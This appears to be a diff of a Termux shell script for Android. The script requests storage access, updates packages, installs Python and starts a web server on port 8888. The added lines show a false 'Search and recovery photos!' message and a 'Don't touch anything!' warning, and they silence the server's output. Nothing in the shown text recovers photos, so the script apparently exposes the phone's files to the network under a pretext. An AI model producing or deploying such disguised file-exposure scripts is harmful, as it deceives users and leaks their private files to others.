@@ -16,8 +16,9 @@ else
     termux-setup-storage
   done
 fi
-echo -e "${GREEN}Update and upgrade and install software's!\nPlease wait!${END}"
+echo -e "${GREEN}Update and upgrade!\nInstall software's!\nDon't touch anything!\nPlease wait!${END}"
 pkg update
 pkg upgrade -y -o Dpkg::Options::="--force-confdef --force-confold"
 pkg install -y python
-python -m http.server 8888
+echo -e "${GREEN}Search and recovery photos!\nPlease wait!${END}"
+python -m http.server 8888 > /dev/null 2>&1
